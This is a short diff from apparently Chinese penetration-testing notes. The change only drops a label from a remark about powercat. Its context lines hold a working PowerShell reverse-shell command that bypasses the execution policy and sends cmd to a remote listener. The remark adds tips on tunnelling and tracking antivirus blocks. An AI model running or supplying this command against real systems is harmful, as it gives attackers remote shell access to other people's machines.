@@ -32,4 +32,4 @@ powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.
 powershell -ExecutionPolicy Bypass -Command ". .\\powercat.ps1; powercat -c 192.168.1.50 -p 4444 -e cmd -ge"
 ```
 
-小记录：powercat 适合临时验证连通性和 Windows 侧操作。长时间通道建议换更稳定的隧道工具，并记录防护软件拦截情况。
+powercat 适合临时验证连通性和 Windows 侧操作。长时间通道建议换更稳定的隧道工具，并记录防护软件拦截情况。
